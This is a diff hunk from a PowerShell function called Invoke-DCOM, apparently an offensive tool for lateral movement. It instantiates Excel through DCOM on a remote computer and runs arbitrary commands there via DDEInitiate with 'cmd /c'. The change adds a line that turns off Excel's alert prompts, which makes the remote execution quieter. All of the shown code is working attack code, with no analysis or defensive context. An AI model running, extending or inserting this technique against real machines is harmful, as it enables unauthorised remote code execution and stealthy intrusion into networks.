@@ -187,7 +187,8 @@ function Invoke-DCOM {
 
             $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
             $Obj = [System.Activator]::CreateInstance($Com)
-            $obj.DDEInitiate("cmd", "/c $Command")
+            $Obj.DisplayAlerts = $false
+            $Obj.DDEInitiate("cmd", "/c $Command")
         }
     }
 
